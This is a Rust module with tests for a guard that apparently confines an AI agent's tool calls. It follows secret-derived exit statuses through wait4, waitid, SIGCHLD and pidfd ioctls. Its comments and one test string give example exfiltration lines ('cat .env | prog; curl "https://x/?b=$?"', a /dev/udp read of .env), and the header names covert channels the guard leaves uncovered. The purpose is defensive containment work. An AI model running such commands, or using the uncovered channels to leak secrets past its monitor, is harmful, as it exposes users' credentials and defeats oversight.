//! wait_flow — the PURE half of following a holder's exit status to the
//! process that learns it (plan 13 §4.9 and §9 R4, decided by the maintainer
//! 2026-10-03: "the reaper of a holder becomes a holder").
//!
//! A process's exit status is a channel: about eight bits from a child to
//! its parent through `wait4` / `waitid` (with `WNOWAIT` too, and the
//! `rusage` beside it), through `SIGCHLD`'s `siginfo` (`si_status`, also read
//! by `sigwaitinfo` and a `signalfd`) delivered at the exit itself, before
//! any wait, and the stop signals a tracer reads. D2 follows a holder's bytes
//! along descriptors, not along that channel: in `cat .env | prog; curl
//! "https://x/?b=$?"` the shell that reaps `prog` was no holder, so the
//! status reached the network. The rule now (the kernel half is
//! `guard_wait`):
//!
//!   - AT THE TAINT: the channel exists from the fork, like a pipe the
//!     taint-time sweep finds, so the sweep treats a new holder's PARENT and
//!     its TRACER as receivers (`guard_send::sweep_from`): each becomes a
//!     holder flowing from it, swept like a pipe's reader (an unbound
//!     connection it holds refuses the raw open), and so on up the chain.
//!     Judged before the reader gets a byte, so a blocking `wait` already in
//!     progress, a `SIGCHLD` handler's `siginfo` and a `signalfd` read
//!     nothing the guard has not followed;
//!   - AT THE WAIT (the later event): `wait4` and `waitid` reach the guard
//!     under a secret policy, and a waiter with a holder among the children
//!     it can reap (its whole subtree when it reaps orphans: a subreaper, a
//!     pid namespace's init) becomes a holder before the kernel performs the
//!     wait (`SECCOMP_USER_NOTIF_FLAG_CONTINUE`; the taint is recorded first,
//!     so the check-then-continue race only ever over-taints). This covers a
//!     holder re-parented to a reaper that was not its ancestor at its taint
//!     (a `setns` into a pid namespace) and a holder the guard learned of
//!     without a sweep (the later-event look of `guard_flow::holder`, an
//!     orphan by the backstop). Which child the kernel will pick is not
//!     decided: ANY holder child the call could match makes the waiter one
//!     (fail-closed, and `wait4(-1)` is what shells call). A sweep that finds
//!     an unbound connection kills the waiter without performing the wait
//!     (an `ECHILD` in its place hung bash and would hang libuv, which then
//!     wait for a child they can no longer reap). A reader whose raw open
//!     the sweep refused holds nothing and is no holder (it was recorded
//!     before the sweep, and is forgotten when it was none before), so the
//!     shell that runs it is not touched (`exec 3<>/dev/udp/…; K=$(cat
//!     .env)`: the read is refused, the shell goes on).
//!
//! Never the agent nor a process above it (the wrap's pid 1, the launcher's
//! wrappers, the guard): the agent reaps every tool call's shell, and what it
//! learns goes to the model through the model exit, where a masked result
//! carries no exit status since 2026-10-03 (`is_error: false`, Codex's
//! header blanked); a process above the agent runs no agent code. With no
//! agent named, nothing is exempt (fail-closed, as D2).
//!
//! Also closed here: `ioctl(PIDFD_GET_INFO)` (6.13+), which hands ANY holder
//! of a pidfd the exit status of the process it names (`PIDFD_INFO_EXIT`,
//! 6.15), parent or not: refused under a secret policy with `ENOTTY`, what a
//! kernel without it answers (`guard_filter::pidfd_info_block`).
//!
//! Not covered (plan 13 §4.9): the `exit_code` field of a zombie's
//! `/proc/<pid>/stat`, read by a process outside its parent's tree while the
//! zombie waits to be reaped (the `/proc` covert channels plan 10 §6
//! accepts); timing (when a holder exits).
//!
//! `Mandu-new`.

/// The wait family. x86_64 and aarch64 have no `waitpid` syscall (glibc's
/// `waitpid` is `wait4`), and `wait3` is `wait4` too.
pub fn wait_nrs() -> [libc::c_long; 2] {
    [libc::SYS_wait4, libc::SYS_waitid]
}

pub fn is_wait_nr(nr: i64) -> bool {
    wait_nrs().iter().any(|n| *n as i64 == nr)
}

/// `ioctl(pidfd, PIDFD_GET_INFO, …)`: `_IOWR(PIDFS_IOCTL_MAGIC, 11, struct
/// pidfd_info)`. The kernel recognizes it by its type and number alone (the
/// struct is extensible, so the size bits vary: `pidfs_ioctl_valid`), so the
/// filter compares the low 16 bits of the request.
pub const PIDFS_IOCTL_MAGIC: u32 = 0xFF;
pub const PIDFD_GET_INFO_NR: u32 = 11;
pub const PIDFD_GET_INFO_LOW: u32 = (PIDFS_IOCTL_MAGIC << 8) | PIDFD_GET_INFO_NR;

/// Is an ioctl request (`args[1]`, read as 32 bits) `PIDFD_GET_INFO`, of any
/// size and direction?
pub fn is_pidfd_get_info(request: u32) -> bool {
    request & 0xFFFF == PIDFD_GET_INFO_LOW
}

/// The tracer a `/proc/<tid>/status` names (`TracerPid:`), None when it is
/// not traced.
pub fn tracer_pid(status: &str) -> Option<i32> {
    status.lines().find_map(|l| l.strip_prefix("TracerPid:")).and_then(|v| v.trim().parse::<i32>().ok()).filter(|p| *p > 0)
}

/// The keys no status makes a holder: the agent's own and every ancestor of
/// it (`ancestors_of`, nearest first, as `secret_open::ancestor_keys_of`
/// reads them). Empty when no agent is known: then nothing is exempt.
pub fn exempt_keys(agents: &[String], ancestors_of: impl Fn(&str) -> Vec<String>) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for a in agents {
        for k in std::iter::once(a.clone()).chain(ancestors_of(a)) {
            if !out.contains(&k) {
                out.push(k);
            }
        }
    }
    out
}

/// May the process `pid` (its proc key `key`) be made a holder because it
/// learns a holder's status (its parent or its tracer)? Not pid 1 or 0, not
/// `guard` (the walking process, and the tree's subreaper: outside the
/// tree), not an exempt key (the agent, or above it).
pub fn receives_status(pid: i32, key: &str, guard: i32, exempt: &[String]) -> bool {
    crate::lineage::chain_continues(pid, guard) && !exempt.iter().any(|e| e == key)
}

/// Which of a waiter's processes a wait can return (`guard_wait`): a waiter
/// that reaps orphans (a subreaper, a pid namespace's init) may reap any
/// process of its subtree, since a descendant whose parent exits is
/// re-parented to it; any other waiter, its children (every thread's).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reapable {
    Children,
    Subtree,
}

pub fn reapable(reaps_orphans: bool) -> Reapable {
    if reaps_orphans {
        Reapable::Subtree
    } else {
        Reapable::Children
    }
}

/// What the guard does with a trapped wait.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WaitVerdict {
    /// Let the kernel perform it (CONTINUE): no reapable holder, an exempt
    /// waiter, or a waiter already holding what every reapable holder holds
    /// (its sockets were judged against those sources when it took them).
    Continue,
    /// Make the waiter a holder flowing from the reapable holders and sweep
    /// it first (`guard_flow::admit_receivers`); then CONTINUE, or kill the
    /// waiter when the sweep refuses.
    Admit,
}

/// `exempt`: the waiter is the agent or above it. `held`: a reapable process
/// holds a secret. `covered`: the waiter already holds every source those
/// holders carry and no earlier wait of it was refused (`TaintedSet::covers`).
pub fn wait_verdict(exempt: bool, held: bool, covered: bool) -> WaitVerdict {
    if exempt || !held || covered {
        WaitVerdict::Continue
    } else {
        WaitVerdict::Admit
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_wait_family_is_wait4_and_waitid() {
        assert!(is_wait_nr(libc::SYS_wait4 as i64));
        assert!(is_wait_nr(libc::SYS_waitid as i64));
        for nr in [libc::SYS_kill, libc::SYS_exit_group, libc::SYS_clone, libc::SYS_rt_sigtimedwait, libc::SYS_read] {
            assert!(!is_wait_nr(nr as i64), "{nr}");
        }
    }

    #[test]
    fn pidfd_get_info_is_matched_by_type_and_number_whatever_its_size() {
        // _IOWR(0xFF, 11, struct pidfd_info): 64 bytes (6.13), 72 (6.15).
        let iowr = |size: u32| (3u32 << 30) | (size << 16) | (0xFF << 8) | 11;
        assert!(is_pidfd_get_info(iowr(64)));
        assert!(is_pidfd_get_info(iowr(72)));
        assert!(is_pidfd_get_info(0xFF0B), "no direction or size bits");
        // The pidfs namespace ioctls (_IO(0xFF, 1..10)) and other drivers'
        // number 11 are not it.
        assert!(!is_pidfd_get_info(0xFF01));
        assert!(!is_pidfd_get_info(0xFF0A));
        assert!(!is_pidfd_get_info((3u32 << 30) | (64 << 16) | (0xFE << 8) | 11));
        assert!(!is_pidfd_get_info(crate::guard_filter::TIOCSTI));
    }

    #[test]
    fn the_tracer_is_read_from_status() {
        assert_eq!(tracer_pid("Name:\tsh\nTracerPid:\t4242\nUid:\t1000\n"), Some(4242));
        assert_eq!(tracer_pid("Name:\tsh\nTracerPid:\t0\n"), None, "not traced");
        assert_eq!(tracer_pid("Name:\tsh\n"), None);
    }

    #[test]
    fn the_agent_and_everything_above_it_are_exempt() {
        let anc = |k: &str| -> Vec<String> {
            match k {
                "100-5" => vec!["90-4".into(), "80-3".into()],
                "101-6" => vec!["100-5".into(), "90-4".into()],
                _ => Vec::new(),
            }
        };
        let ex = exempt_keys(&["100-5".into(), "101-6".into()], anc);
        assert_eq!(ex, vec!["100-5".to_string(), "90-4".into(), "80-3".into(), "101-6".into()]);
        assert!(exempt_keys(&[], anc).is_empty(), "no agent known: nothing is exempt");
    }

    #[test]
    fn a_status_reaches_a_process_of_the_tree_but_never_the_agent_init_or_the_guard() {
        let ex = vec!["100-5".to_string(), "90-4".to_string()];
        assert!(receives_status(300, "300-9", 17, &ex), "a tool call's shell");
        assert!(!receives_status(100, "100-5", 17, &ex), "the agent");
        assert!(!receives_status(90, "90-4", 17, &ex), "the wrap above the agent");
        assert!(!receives_status(17, "17-1", 17, &ex), "the guard");
        assert!(!receives_status(1, "1-1", 17, &ex), "init");
        assert!(!receives_status(0, "0-0", 17, &ex));
        assert!(receives_status(90, "90-4", 17, &[]), "no agent known: the wrap is not exempt");
    }

    #[test]
    fn a_reaper_of_orphans_may_reap_its_whole_subtree() {
        assert_eq!(reapable(true), Reapable::Subtree);
        assert_eq!(reapable(false), Reapable::Children);
    }

    #[test]
    fn a_wait_admits_the_waiter_only_for_a_holder_it_does_not_already_cover() {
        assert_eq!(wait_verdict(false, true, false), WaitVerdict::Admit, "`cat .env | prog; curl …`: the shell reaps prog");
        assert_eq!(wait_verdict(false, false, false), WaitVerdict::Continue, "no holder to reap");
        assert_eq!(wait_verdict(true, true, false), WaitVerdict::Continue, "the agent reaps its call's shell");
        assert_eq!(wait_verdict(false, true, true), WaitVerdict::Continue, "a holder shell reaping a child that inherits from it");
    }
}
